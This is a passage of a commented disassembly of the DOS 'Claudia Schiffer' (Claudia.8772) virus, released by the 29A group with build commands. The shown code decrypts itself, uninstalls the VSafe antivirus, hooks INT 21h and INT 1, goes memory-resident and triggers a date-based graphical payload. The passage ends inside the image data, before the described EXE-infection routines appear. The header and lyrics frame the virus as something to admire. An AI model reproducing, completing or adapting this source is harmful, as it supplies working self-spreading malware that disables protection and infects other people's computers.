   ;
   ;           ÍÎÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÎÍ
   ;            º       ClaudiaSchiffer.8772   º
   ;            º      disassembly by      º
   ;            º Darkman/29A & Mister Sandman/29A º
   ;           ÍÎÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÎÍ
   ;
   ; Darkman and Mister Sandman, that is us, in our first coproduction project,
   ; very proudly present our disassembly of the Claudia Schiffer virus. It was
   ; a matter of one couple hours of work each to complete this source, a great
   ; thing for us both, as no one of us expected each other to be that quick :)
   ;
   ; The virus itself wasn't technically speaking a big challenge, but a pretty
   ; good exercise and who knows if the first of a long series of disassemblies
   ; Darkman and i might do together in the near future. But, by now, it's just
   ; the source of a virus which was in hot fashion not too long ago due to its
   ; spectacular graphical payload. In my opinion it is quite poorly written as
   ; it does a lot of weird non-sense things and spends a lot of unuseful bytes
   ; in routines which could have been written in a much better way. Apart from
   ; this, its modularization ain't too brilliant as well.
   ;
   ; Anyway it doesn't lack at all in the sense that it uses some nice features
   ; such as full stealth (both DTA and FCB, in opens and reads), int 1 hooking
   ; and some more you'll have the chance to discover on your own by going thru
   ; this disassembled, labelled, and commented source code. The most important
   ; feature of this virus, as i said before, is its payload, which consists on
   ; displaying an image of Claudia Schiffer together with some lyrics from the
   ; song "22 Acacia Avenue", by Iron Maiden. Heavy metal fans, you're lucky :)
   ;
   ; Let's read some words from our sponsor (buahahaha):
   ;
   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
   ; Claudia.8772
   ; ÄÄÄÄÄÄÄÄÄÄÄÄ
   ; It is not a dangerous memory resident encrypted parasitic stealth virus.
   ; It hooks INT 21h and writes itself to the end of EXE files that are ac-
   ; cessed. Starting from August 25 1996 the virus manifests itself by a vi-
   ; deo effect: it turns the computer to the graphic video mode, displays an
   ; image of Claudia Schiffer and displays the message:
   ;
   ;      Das ist ClaudiaSchiffer virus by OS
   ;    Sometimes when U stroling down the
   ;    Avenue the way U walk it makes men
   ;    Thinkof HAVING U when U walking
   ;    Down the street everybody stops
   ;    &  turns 2 stare at U! (IrM)
   ;     Hope 2 meet U...somewhere in time
   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
   ;
   ; Btw, that's a pretty short description coming from Kaspy for a russian vi-
   ; rus. I think he probably just didn't know about its country of origin :P
   ;
   ; And now it is time to listen to Kraftwerk's song "Das Modell", which has a
   ; lot to do with this virus and is, btw, one of my favorite oldies... do not
   ; hesitate for a single second if you have the chance to download its MP3.
   ;
   ;
   ;     ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;           She's a model and she's looking good.
   ;       I'd like to take her home, that's understood.
   ;       She plays hard to get, she smiles from time to time.
   ;        It only takes a camera to change her mind.
   ;
   ;      She's going out tonight, loves drinking just champagne.
   ;       And she has been checking nearly all the men.
   ;         She's playing her game and you can hear them say,
   ;       "she's looking good, for beauty we will pay".
   ;
   ;         She's posing for consumer products now, and then,
   ;        for every camera she gives the best she can.
   ;           I saw her on the cover of a magazine.
   ;          Now she's a big success, I want to meet her again.
   ;              ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                  (The Man Machine)
   ;
   ;
   ; Compile with
   ; ÄÄÄÄÄÄÄÄÄÄÄÄ
   ; tasm /m claudia.asm
   ; tlink /t /x claudia.obj


   .model tiny
   .code
    org   100h              ; Origin of Claudia.8772

   code_begin:
            jmp     crypt_begin

            db      1bh dup (90h)
   virus_begin:
   crypt_offset equ     word ptr $+01h  ; Offset of crypt_begin
            lea     bx,crypt_begin  ; BX = offset of crypt_begin
   crypt_key    equ     byte ptr $+01h  ; Offset of decryption key
            mov     al,00h      ; AL = decryption key
   crypt_loop:
            xor     cs:[bx],al      ; Decrypt a byte
            inc     bx          ; Increase index register
            neg     al          ; Negate decryption key

   crypt_offse_ equ     word ptr $+02h  ; Offset of crypt_end
            cmp     bx,offset crypt_end ; Offset of crypt_end?
            jbe     crypt_loop      ; Below or equal? Jump to crypt_loop
   crypt_begin:
            call    delta_offset
   delta_offset:
            pop     bp          ; Load BP from stack
            sub     bp,offset delta_offset

            push    ds es       ; Save segments at stack

            jmp     test_install

            nop

            db      11101001b       ; JMP imm16 (opcode 0e9h)
   test_install:
            mov     ax,'CS'             ; Claudia.8772 function
            int     21h
            cmp     bx,'OS'             ; Already installed?
            jne     uninstall       ; Not equal? Jump to uninstall

            jmp     virus_exit
   uninstall:
            mov     ax,0fa01h       ; PC Tools V8+ Vsafe, Vwatch - Uin...
            mov     dx,5945h        ; "    "    "    "      "    "   "
            int     21h

            mov     ah,2ah      ; Get system date
            int     21h
            cmp     cx,7cch         ; 1996?
            jne     payload         ; Not equal? Jump to payload
            cmp     dx,819h         ; August 25?
            jb      allocate_mem    ; Below? Jump to allocate_mem
   payload:
            push    es          ; Save ES at stack

            call    payload_

            pop     es          ; Load ES from stack
   allocate_mem:
            mov     ax,es       ; AX = segment of PSP for current ...
            dec     ax          ; AX = segment of current Memory C...
            mov     ds,ax       ; DS =    "    "     "      "     "

            sub     word ptr ds:[03h],(data_end-code_begin+0fh)/10h+01h
            sub     word ptr ds:[12h],(data_end-code_begin+0fh)/10h+01h

            mov     ax,ds:[12h]     ; AX = segment of the virus
            mov     ds,ax       ; DS =    "    "   "    "

            sub     ax,0fh      ; Subtract fifteen from segment of...
            mov     es,ax       ; ES = segment of the virus - 0fh

            mov     byte ptr ds:[00h],'Z'
            mov     word ptr ds:[01h],08h
            mov     word ptr ds:[03h],(data_end-code_begin+0fh)/10h+01h

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     di,100h         ; DI = offset of virus in memory
            mov     cx,(code_end-code_begin)
            lea     si,[bp+code_begin]  ; SI = offset of code_begin
            rep     movsb       ; Move the virus to top of memory

            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of BIOS data segment
            sub     word ptr ds:[413h],(code_end-code_begin+3ffh)/400h-02h

            mov     si,(21h*04h)    ; SI = offset of interrupt 21h
            lea     di,int21_addr   ; DI = offset of int21_addr
            movsw           ; Get interrupt vector 21h
            movsw           ;  "      "       "     "

            lea     dx,[bp+int01_virus] ; DX = offset of int01_virus
            mov     ds:[(01h*04h)],dx   ; Set interrupt vector 01h
            mov     ds:[(01h*04h+02h)],cs

            push    es          ; Save ES at stack
            mov     ah,52h      ; Get list of lists
            int     21h
            mov     ax,es       ; AX = segment of DOS list of lists
            mov     cs:[bp+dos_list_seg],ax
            pop     es          ; Load ES from stack

            mov     [bp+virus_seg],es   ; Store segment of virus in top of...

            mov     ax,100h         ; Set trap flag
            push    ax          ; Save AX at stack
            popf            ; Load flags from stack

            mov     ah,0bh      ; Get stdin status
            pushf           ; Save flags at stack
            call    dword ptr ds:[(21h*04h)]

            xor     ax,ax       ; Clear trap flag
            push    ax          ; Save AX at stack
            popf            ; Load flags from stack

            mov     word ptr [si-04h],00h
            mov     word ptr [si-04h],offset int21_virus
            mov     [si-02h],es     ; Set interrupt vector 21h
   virus_exit:
            pop     es ds       ; Load segments from stack

            mov     ax,ds       ; AX = segment of PSP for current ...

            add     ax, cs:[bp+initial_cs_]
            mov     cs:[bp+initial_cs],ax

            mov     ax, cs:[bp+initial_ip_]
            mov     cs:[bp+initial_ip],ax

            mov     ax,ds       ; AX = segment of PSP for current ...
            add     ax,cs:[bp+initial_ss]
            cli             ; Clear interrupt-enable flag
            mov     ss,ax       ; SS = initial SS relative to star...
            mov     sp,cs:[bp+initial_sp]

            call    zero_regs

            db      11101010b       ; JMP imm32 (opcode 0eah)
   initial_ip   dw      00h         ; Initial IP
   initial_cs   dw      0fff0h      ; Initial CS relative to start of ...
   message      db      ' Das ist ClaudiaSchiffer virus by OS  ',0dh,0ah,0ah,0ah
            db      '   Sometimes when U stroling down the',0dh,0ah,0ah
            db      '   Avenue the way U walk it makes men',0dh,0ah,0ah
            db      '   Thinkof HAVING U when U walking',0dh,0ah,0ah
            db      '   Down the street everybody stops',0dh,0ah,0ah
            db      '   &  turns 2 stare at U!',9,'(IrM)',0dh,0ah,0ah,0ah
            db      'Hope 2 meet U...somewhere in time$'
   image_byte   db      ?           ; Byte within image
   counter      dw      ?           ; Counter
   image        db      0c1h,0fah,7eh,0c1h,0fah,7eh,0c1h,0d6h,0c1h,0fah,7eh,6dh
            db      0c1h,0fah,7eh,6dh,0c1h,0fah,0c2h,7eh,42h,3ah,02h,0c2h
            db      0f7h,77h,26h,61h,71h,04h,1fh,34h,45h,5ch,0c2h,1bh,7fh,1bh
            db      0c2h,4ch,36h,45h,09h,1fh,0c1h,0cdh,34h,0c2h,45h,4ch,24h
            db      4ch,0c1h,0e0h,45h,0c1h,0e0h,0c1h,0f6h,4ch,0c1h,0f1h,0bah
            db      0c2h,0dh,72h,0c1h,0f1h,7fh,34h,1fh,0c1h,0d4h,53h,0c1h
            db      0f8h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h
            db      0fah,7eh,0c1h,0fah,0c2h,7eh,0c1h,0fah,7eh,0c1h,0fah,6dh
            db      0c3h,0fah,0c2h,7eh,0c1h,0e3h,0c1h,0d5h,0c1h,0d3h,86h,23h
            db      39h,1dh,53h,14h,32h,57h,1fh,12h,5ch,0c3h,1bh,0c2h,36h,5ch
            db      80h,34h,6ah,1fh,4fh,80h,0c2h,0b3h,6eh,0c2h,76h,0c2h,4ch
            db      36h,6eh,0c1h,0f6h,0c1h,0f1h,0bah,76h,0c2h,72h,76h,0c1h
            db      0f6h,45h,34h,32h,1eh,30h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0c6h,00h,0c1h,0d6h,0c1h,0fah,7eh,0c2h,0fah,7eh,0c1h
            db      0fah,0c3h,7eh,0c1h,0fah,0c3h,7eh,91h,51h,0c2h,0cfh,0c2h
            db      59h,53h,04h,0c1h,0dfh,57h,1fh,11h,1fh,12h,5ch,36h,1bh,5ch
            db      45h,0b3h,6ah,09h,1fh,57h,63h,30h,14h,0c1h,0d4h,48h,8bh
            db      31h,05h,0c2h,6eh,0c2h,05h,31h,05h,0c1h,0f6h,76h,0b8h,4ch
            db      1bh,36h,12h,14h,30h,1eh,0ffh,00h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0c6h,00h,0c2h,7eh,42h,7eh,0c1h,0fah,7eh,0c2h,0fah,7eh
            db      0c1h,0d6h,0c2h,7eh,0c1h,0fah,0c1h,0e3h,70h,10h,0c1h,0d8h
            db      0c1h,0f5h,59h,06h,55h,63h,11h,57h,32h,11h,1fh,34h,45h
            db      0c2h,36h,0b3h,34h,0c2h,6ah,0c2h,34h,0b3h,12h,1fh,4fh,0c1h
            db      0d4h,53h,0eh,0c2h,46h,94h,09h,6eh,0c1h,0f6h,05h,0a6h,48h
            db      09h,0c1h,0e0h,36h,6eh,36h,05h,57h,0c1h,0d4h,06h,0ffh,00h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c2h,0fah,7eh,0c1h
            db      0fah,7eh,0c1h,0fah,7eh,6dh,7eh,42h,7eh,6dh,0c1h,0e3h,0c1h
            db      0c2h,0c1h,0f0h,41h,6ch,61h,1dh,53h,14h,60h,32h,0c2h,63h
            db      11h,34h,45h,5ch,0c2h,45h,6ah,4fh,2eh,34h,45h,5ch,36h,1bh
            db      5ch,07h,2eh,14h,1dh,0c2h,94h,71h,59h,6ch,0c1h,0cdh,0b8h
            db      0b9h,17h,0c1h,0e0h,71h,46h,94h,48h,0a6h,09h,0c1h,0cdh,14h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,7eh,0c1h
            db      0fah,7eh,0c2h,0fah,7eh,0c1h,0fah,7eh,0c1h,0fah,0c2h,7eh
            db      0c1h,0fah,6dh,0c1h,0f0h,46h,94h,0bbh,94h,71h,30h,0c2h,14h
            db      63h,32h,1fh,34h,45h,5ch,0c2h,45h,9dh,4fh,55h,0c2h,2eh,34h
            db      45h,7fh,84h,7fh,45h,12h,14h,30h,71h,94h,71h,4fh,6ch,56h
            db      39h,46h,0b2h,0c2h,0b8h,80h,8fh,79h,0c2h,0e7h,6fh,61h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,7eh,0c1h,0fah,7eh
            db      0c1h,0d6h,7eh,0c1h,0fah,7eh,6dh,42h,7eh,91h,0c1h,0e3h,3ah
            db      61h,0a6h,6ch,30h,94h,0c1h,0d4h,14h,57h,63h,04h,1fh,34h
            db      5ch,36h,45h,5fh,4fh,0ah,1dh,0ah,55h,63h,34h,5ch,1bh,84h
            db      0c2h,1bh,45h,1fh,14h,30h,53h,94h,57h,09h,31h,65h,46h,26h
            db      46h,0a6h,05h,0b3h,0c1h,0cdh,3eh,4fh,8fh,94h,0ffh,00h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0fah,7eh,0c1h,0fah
            db      7eh,0c1h,0fah,7eh,0c1h,0fah,0c1h,0d6h,7eh,54h,49h,0c1h
            db      0e4h,59h,0c2h,4fh,0c2h,71h,14h,55h,14h,32h,14h,32h,1fh
            db      34h,45h,34h,18h,0ah,0c2h,79h,0c1h,0e5h,79h,5eh,0ah,55h
            db      6ah,36h,1bh,0c2h,24h,1bh,80h,55h,53h,46h,1dh,6ch,0a6h,34h
            db      0b3h,0c1h,0e9h,80h,8fh,71h,0c1h,0cdh,31h,0b3h,09h,2eh,1fh
            db      32h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,7eh,42h
            db      7eh,0c1h,0fah,7eh,0c1h,0fah,7eh,0c1h,0fah,7eh,0c1h,0e3h
            db      0c1h,0c2h,23h,48h,0c2h,4fh,0c2h,71h,4fh,0c2h,57h,1fh,63h
            db      32h,34h,07h,6ah,74h,5eh,2dh,79h,0c1h,0e5h,40h,0c1h,0e5h
            db      79h,2dh,74h,2eh,80h,45h,1bh,84h,4ch,1bh,2eh,53h,59h,46h
            db      0c1h,0f8h,61h,8fh,1fh,80h,1bh,6eh,0c1h,0e0h,31h,0c2h,05h
            db      80h,0c3h,1fh,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      0c1h,0d6h,7eh,0c1h,0fah,7eh,0c2h,0fah,7eh,0c1h,0fah,49h
            db      0c1h,0c2h,0c1h,0f7h,46h,0a6h,57h,14h,0c2h,4fh,57h,09h,1fh
            db      32h,60h,1fh,12h,09h,0c1h,0cah,2dh,0c4h,0e5h,0aeh,0c2h
            db      0e5h,2dh,0ah,55h,2eh,6ah,0c1h,0e0h,1bh,0c1h,0f1h,0c1h
            db      0f6h,0b3h,94h,0c1h,0f8h,0c1h,0f5h,0c1h,0f8h,39h,0eh,14h
            db      2eh,5fh,1bh,6eh,1bh,0c2h,36h,45h,1fh,34h,1fh,0ffh,00h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,7eh,0c1h,0fah,7eh
            db      0c2h,0fah,7eh,0c1h,0fah,7eh,0c1h,0fah,21h,0a8h,14h,57h
            db      63h,1fh,0c2h,4fh,09h,34h,0c3h,1fh,34h,80h,18h,0ah,16h
            db      0c3h,0e5h,0aeh,0c2h,40h,0bh,79h,5eh,0ah,0c2h,55h,6ah,45h
            db      0c1h,0f6h,6eh,0b3h,48h,0c1h,0e7h,23h,46h,0c1h,0fbh,7ah
            db      46h,30h,63h,1fh,05h,5ch,0c2h,45h,12h,0c3h,34h,0ffh,00h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0fah,7eh,0c1h
            db      0fah,7eh,0c1h,0fah,7eh,0c1h,0fah,7eh,0c1h,0d6h,86h,71h
            db      0c1h,0d4h,4fh,0c3h,57h,1fh,0c2h,09h,34h,0c2h,1fh,5fh,18h
            db      30h,5eh,79h,16h,0c1h,0e5h,0c2h,0aeh,7bh,0bh,0aeh,40h,0bh
            db      79h,5eh,0ah,30h,3eh,0b3h,45h,09h,0a6h,61h,0c1h,0e2h,0c1h
            db      0f8h,7ah,4ah,0c1h,0f2h,1dh,5dh,30h,09h,12h,36h,5ch,0c2h
            db      45h,0b3h,1fh,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      7eh,0c1h,0fah,7eh,0c1h,0fah,7eh,0c1h,0fah,7eh,0c1h,0fah
            db      3ah,0eh,0c2h,14h,4fh,57h,4fh,0c3h,09h,34h,09h,34h,0c2h
            db      6ah,5bh,0ah,5eh,0c2h,0e5h,7bh,0c2h,0aeh,0bh,40h,0c3h,0adh
            db      0bh,6fh,79h,1dh,0ah,55h,3eh,2eh,0a6h,46h,0c2h,0f8h,23h
            db      4ah,0c1h,0c4h,0c1h,0f8h,61h,69h,53h,4fh,80h,0c2h,36h,0b3h
            db      34h,11h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,7eh
            db      0c1h,0fah,7eh,42h,7eh,0c1h,0fah,7eh,91h,23h,48h,4fh,14h
            db      4fh,0a6h,0c3h,09h,45h,31h,05h,0b3h,4fh,55h,0c1h,0c9h,5bh
            db      5eh,6bh,0aeh,7bh,0bh,7bh,40h,0aeh,0c3h,0adh,22h,0c2h,40h
            db      0bh,6fh,79h,0ah,6ch,30h,6ch,0c1h,0f5h,0c2h,0f8h,7ah,0c1h
            db      0c4h,0c1h,0fbh,56h,0c1h,0f8h,7dh,0fh,06h,14h,09h,0b3h,34h
            db      1fh,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h
            db      0fah,7eh,0c1h,0d6h,7eh,0c1h,0fah,7eh,0c1h,0fah,0c1h,0d5h
            db      0c1h,0d8h,57h,48h,14h,0c2h,0a6h,0c3h,09h,0c3h,05h,0beh
            db      55h,1dh,5bh,7ch,9ah,0bh,0c2h,7bh,22h,0aeh,40h,22h,0adh
            db      0c2h,7dh,0c2h,0adh,43h,0aeh,56h,7dh,0c1h,0e5h,0c3h,1dh
            db      0c2h,59h,0c1h,0e7h,39h,77h,0c1h,0fbh,0c1h,0f0h,0c1h,0f8h
            db      8dh,0fh,0c1h,0edh,0c1h,0e7h,06h,14h,34h,1fh,0ffh,00h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0c6h,00h,0c2h,7eh,0c1h,0fah,7eh
            db      0c2h,0fah,91h,0c1h,0d3h,48h,94h,0c1h,0d4h,0c2h,0a6h,57h
            db      09h,0b3h,31h,05h,0c1h,0f6h,36h,60h,30h,5bh,7ch,2dh,0c1h
            db      0c3h,0bh,7bh,0adh,0c2h,7bh,0adh,0aeh,0adh,7dh,0c2h,0adh
            db      22h,0adh,22h,0c2h,40h,43h,79h,59h,41h,0c1h,0cfh,26h,59h
            db      39h,0c1h,0e7h,77h,0c1h,0f0h,0c1h,0f8h,0bh,0c1h,0e7h,39h
            db      0c2h,0edh,8dh,1eh,57h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h
            db      0c6h,00h,0c5h,0fah,91h,97h,10h,2fh,94h,0c2h,48h,3bh,0a6h
            db      57h,0b3h,05h,36h,0c1h,0f6h,45h,0c2h,30h,7ch,5eh,0c2h,6bh
            db      0bh,7bh,0bh,7bh,0aeh,40h,0c5h,0adh,22h,7dh,0adh,22h,7dh
            db      40h,6fh,59h,10h,59h,0c1h,0f2h,61h,6fh,0fh,0c2h,0f0h,0c1h
            db      0f8h,6fh,39h,0fh,0c3h,0edh,26h,0c1h,0d2h,0ffh,00h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0c6h,00h,42h,0c1h,0fah,7eh,6dh,7eh
            db      0c1h,0c2h,67h,0c1h,0cfh,2fh,46h,2fh,0c1h,0cfh,0c1h,0d8h
            db      3bh,0c1h,0cch,0b3h,0c3h,05h,18h,0ah,5bh,2dh,0c2h,6bh,0bh
            db      7bh,0bh,7bh,40h,0c2h,0aeh,0c3h,0adh,0c2h,22h,0adh,7dh
            db      0adh,22h,7dh,43h,56h,79h,59h,39h,23h,06h,04h,0c3h,39h
            db      0c1h,0e7h,10h,39h,0c1h,0f0h,77h,0c1h,0eah,0c1h,0fbh,0fh
            db      0c1h,0f2h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      0c1h,0fah,0c2h,7eh,0c2h,0fah,0c1h,0c2h,68h,0c1h,0d8h,46h
            db      0c1h,0cfh,7ah,0c1h,0f7h,0c1h,0cfh,46h,8fh,0c2h,05h,0b3h
            db      4fh,30h,5eh,69h,0c2h,6bh,0bh,0c2h,7bh,0c2h,0bh,7bh,22h
            db      7bh,0aeh,22h,0c2h,0adh,22h,0c3h,7dh,0adh,7dh,0adh,0c2h
            db      6fh,59h,56h,0c1h,0d3h,43h,14h,53h,39h,77h,39h,0c1h,0d3h
            db      59h,26h,77h,0fh,77h,39h,0c1h,0f2h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0ffh,00h,0c6h,00h,0c2h,0fah,91h,6dh,0c1h,0fah,0c1h
            db      0dbh,68h,0c1h,0cfh,0a8h,59h,51h,0c1h,0d3h,2fh,48h,31h
            db      0c2h,05h,8fh,0ah,5eh,0c3h,2dh,0bh,0c1h,0e5h,7bh,0bh,7bh
            db      0bh,0aeh,7bh,40h,0c2h,0adh,22h,0aeh,0adh,0c2h,7dh,52h
            db      0c2h,7dh,22h,40h,56h,59h,6fh,59h,39h,0c1h,0e7h,4fh,69h
            db      43h,39h,26h,94h,2dh,0c1h,0f8h,6fh,06h,59h,06h,0ffh,00h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c4h,0fah,0c1h,0e4h
            db      0c1h,0dbh,68h,7ah,0c1h,0f0h,51h,0c1h,0d3h,47h,0c1h,0d3h
            db      4fh,0b3h,05h,0c1h,0cdh,8fh,30h,1dh,2dh,0c4h,0e5h,0bh,7bh
            db      40h,0c2h,0aeh,40h,7bh,0c3h,0adh,22h,0adh,0c2h,7dh,0c2h
            db      52h,0c2h,7dh,43h,22h,6fh,0c1h,0f8h,6fh,77h,0c1h,0c4h,30h
            db      14h,33h,39h,26h,0c3h,69h,06h,0c2h,53h,69h,0ffh,00h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0c6h,00h,0c2h,0fah,6dh,91h,70h,0c1h
            db      0eah,0c1h,0d5h,42h,0c1h,0d6h,0c1h,0c2h,67h,0c1h,0d5h,7ah
            db      0a6h,09h,31h,0c2h,80h,0beh,18h,1dh,0bh,7bh,0c1h,0e5h,7bh
            db      0bh,0c3h,0aeh,40h,0aeh,22h,0c4h,0adh,0c2h,7dh,0adh,0c2h
            db      52h,0c2h,7dh,0c2h,22h,06h,8dh,59h,0c1h,0e2h,0c1h,0c4h,8dh
            db      30h,04h,6fh,0c1h,0f8h,06h,53h,55h,5bh,0b6h,1eh,30h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,7eh,6dh,0c2h,0c2h
            db      67h,0c1h,0dbh,6dh,54h,0c1h,0dbh,0c2h,70h,0c1h,0fah,4ah
            db      0a6h,1fh,2eh,31h,6eh,36h,0b7h,55h,0c2h,0e5h,6bh,0bh,0c2h
            db      0aeh,0adh,40h,0c2h,0aeh,0c5h,0adh,0c5h,7dh,52h,0adh,22h
            db      0c1h,0e7h,2dh,0c1h,0e7h,0c1h,0f8h,56h,0c2h,77h,69h,5dh
            db      1eh,26h,6fh,53h,30h,04h,5bh,1eh,5dh,0ffh,00h,0ffh,00h
            db      0ffh,00h,0ffh,00h,0c6h,00h,42h,6dh,0c1h,0c2h,3ah,0c1h
            db      0e4h,0c1h,0c2h,0c1h,0e4h,21h,0c1h,0f7h,0c1h,0d3h,0c1h
            db      0cfh,39h,94h,0c1h,0cdh,4fh,0c2h,46h,71h,0b2h,0c1h,0e0h
            db      2ch,0ah,0c3h,0e5h,0c3h,0aeh,22h,0adh,22h,0c2h,0aeh,0adh
            db      0c4h,7dh,43h,0c4h,7dh,0adh,40h,79h,2dh,6fh,59h,39h,0c1h
            db      0d9h,0c1h,0e7h,53h,0c2h,5dh,6fh,33h,53h,55h,1eh,0b6h,69h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,6dh,7eh,0c1h
            db      0e4h,6dh,0c1h,0c2h,3ah,97h,23h,0c1h,0f8h,0c1h,0efh,48h
            db      71h,4fh,09h,4fh,0c2h,1dh,61h,0bbh,9dh,80h,2ch,0ah,6bh
            db      0c1h,0e5h,0bh,0adh,40h,0adh,7dh,0c4h,0adh,0c3h,7dh,0c2h
            db      52h,0adh,0c3h,7dh,0adh,40h,0bh,2dh,6fh,1dh,0c1h,0e7h,77h
            db      0c1h,0e7h,8dh,0c2h,0b6h,69h,06h,69h,0c2h,33h,0c2h,8dh
            db      0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0fah
            db      0c2h,91h,0c1h,0c2h,0c1h,0eah,0c1h,0f7h,68h,51h,0a8h,0c1h
            db      0d4h,0c2h,57h,14h,48h,0a6h,9dh,3eh,0c2h,5eh,0bbh,9dh,0c1h
            db      0e0h,55h,2dh,6bh,0bh,0aeh,0adh,40h,7dh,40h,7dh,0c3h,0adh
            db      0c4h,7dh,52h,0c2h,7dh,0adh,7dh,40h,0bh,2dh,61h,30h,0c1h
            db      0f5h,39h,43h,39h,0c1h,0e7h,06h,0b6h,69h,33h,8dh,7bh,0fh
            db      0c1h,0e7h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h
            db      0c2h,6dh,0c1h,0c2h,3ah,67h,02h,0c1h,0eah,21h,26h,46h,0c1h
            db      0d4h,09h,0c2h,0a6h,2bh,76h,8ah,2ch,0bfh,5eh,74h,0c1h,0e0h
            db      2eh,5eh,6bh,0bh,0aeh,0c2h,40h,0aeh,0adh,22h,0adh,0cah,7dh
            db      0adh,40h,0c2h,0bh,69h,53h,0ah,06h,26h,39h,77h,39h,33h,3dh
            db      0b6h,9ah,33h,0c2h,22h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h
            db      0c6h,00h,6dh,0c1h,0c2h,0c1h,0dbh,0c1h,0d5h,0c1h,0eah,0c1h
            db      0dbh,3ah,51h,0c1h,0cfh,3bh,4fh,0b3h,0c1h,0cdh,62h,0afh
            db      0c2h,00h,0aah,0b8h,0b2h,6ch,18h,9dh,5bh,2dh,0c2h,0bh,40h
            db      0adh,40h,0aeh,22h,43h,0adh,0c2h,7dh,52h,7dh,52h,0c4h,7dh
            db      0c2h,0adh,0bh,6bh,0c2h,69h,30h,94h,59h,0c1h,0e7h,77h,4ah
            db      0c1h,0d9h,0c1h,0e7h,26h,0c2h,06h,33h,8dh,0ffh,00h,0ffh
            db      00h,0ffh,00h,0ffh,00h,0c6h,00h,7eh,3ah,0c1h,0eah,0c2h
            db      0dbh,0c3h,0eah,86h,3bh,0a6h,09h,8bh,85h,0afh,0c1h,0c5h
            db      0c1h,0fch,0c1h,0dch,0c1h,0e8h,9bh,65h,30h,6ah,55h,0ah,2dh
            db      0bh,7bh,40h,0aeh,40h,7dh,0c2h,0adh,0c4h,52h,7dh,0c2h,52h
            db      0c2h,7dh,0adh,7bh,0c2h,0bh,0c2h,0ah,53h,0ah,69h,59h,0c1h
            db      0e7h,77h,0c2h,91h,0c1h,0c4h,4ah,0c1h,0edh,0c2h,0fh,0ffh
            db      00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h,0c2h,70h
            db      0c1h,0dbh,0c2h,3ah,0c2h,0eah,0c1h,0f0h,59h,8fh,09h,31h
            db      48h,64h,0a4h,75h,0a0h,8eh,8ch,87h,38h,20h,3eh,55h,5bh,33h
            db      0bh,40h,0bh,6bh,2dh,0c2h,0bh,40h,0adh,0c2h,52h,0c1h,0d9h
            db      0c3h,52h,7dh,0c2h,0adh,22h,0bh,6bh,0c1h,0c3h,0c2h,5bh
            db      0c2h,53h,0c2h,1dh,69h,0c1h,0f2h,4ah,0c3h,0d6h,25h,0c1h
            db      0c4h,0ffh,00h,0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c1h
            db      0c2h,0c1h,0dbh,0c1h,0eah,0c1h,0d5h,67h,0c2h,0eah,39h,26h
            db      61h,6ch,1dh,59h,0c1h,0cch,8ah,0ach,0c1h,0d5h,0c1h,0feh
            db      0a1h,0bdh,0c1h,0f4h,0b8h,0b7h,30h,33h,0c4h,0bh,5eh,0ah
            db      0c1h,0cah,74h,0ah,79h,56h,52h,0c1h,0d9h,92h,52h,0c3h,7dh
            db      0adh,7bh,0bh,6bh,2dh,0c4h,55h,30h,53h,69h,0ah,33h,6fh
            db      0c1h,0d2h,26h,4ah,0c1h,0c4h,0ffh,00h,0ffh,00h,0ffh,00h
            db      0ffh,00h,0c6h,00h,3ah,0c3h,0eah,0c2h,7ah,0c2h,0f2h,0c1h
            db      0e7h,26h,6fh,10h,0c1h,0f5h,41h,6ch,85h,19h,0c1h,0fdh,0c1h
            db      0dch,0c2h,0a1h,64h,0c1h,0ddh,30h,6fh,0c2h,22h,40h,2dh,30h
            db      63h,0c1h,0cdh,2eh,9dh,0c2h,5fh,5eh,0c2h,43h,77h,0c1h,0d9h
            db      52h,43h,22h,0adh,7bh,6bh,0c1h,0c3h,5bh,63h,4fh,60h,14h
